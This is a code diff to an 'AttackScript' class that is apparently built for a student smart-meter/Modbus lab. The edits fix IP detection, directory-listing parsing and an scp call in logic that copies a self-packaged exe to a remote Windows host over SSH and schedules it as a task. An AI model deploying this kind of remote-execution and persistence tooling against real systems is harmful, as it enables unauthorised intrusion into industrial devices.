@@ -54,7 +54,7 @@ class AttackScript:
         # Path for the Modpoll
         # TODO: Either a modpoll path finder or make a modpoll unpacker
         # self.MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
-        self.MODPOLL_PATH = r"C:\Users\Student"
+        self.MODPOLL_PATH = "C:\\Users\\Student"
 
 
 ###########
@@ -144,10 +144,10 @@ class AttackScript:
         Args:
             folder_path (str):
         """
-        ip_addr = socket.gethostbyname(socket.gethostname())
+        ip_addrs_in_system: list[str] = [i[4][0] for i in socket.getaddrinfo(socket.gethostname(), None)]
 
         # If the thing is ran locally
-        if ip_addr == self.WINDOWS_SERVER_IP:
+        if self.WINDOWS_SERVER_IP in ip_addrs_in_system:
             for root, dirs, files in walk(folder_path):
                 for file in files:
                     og = path.join(root, file)
@@ -159,7 +159,8 @@ class AttackScript:
         else:
             check_file_exist = self.ssh_run_command(f"dir {self.MODPOLL_PATH}")
 
-            if path.basename(__file__).rsplit('.', 1)[0] + ".exe" not in check_file_exist.split(" "):
+            if (path.basename(__file__).rsplit('.', 1)[0] + ".exe") not in check_file_exist.replace("\n", " ").split(" "):
+                # Try to compile to exe if it is windows and the exe doesnt exist yet. If exe alrd exist, just create the task scheduler
                 if platform.system() != "Windows":
                     raise Exception("Executable not found in remote machine, need to be a windows machine to package this to exe and transfer remotely")
                 self.transfer_exe_remotely()
@@ -1374,7 +1375,7 @@ class AttackScript:
         if remote_path is None:
             remote_path = self.MODPOLL_PATH
 
-        self.scp_transfer_file(f"dist/{executable_name}", remote_path=f"{remote_path}/{executable_name}")
+        self.scp_transfer_file(f"dist/{executable_name}", f"{remote_path}/{executable_name}")
 
         #print(self.ssh_run_command(f"{self.MODPOLL_PATH}\\{sys.argv[0][:-3]}.exe cool"))
     
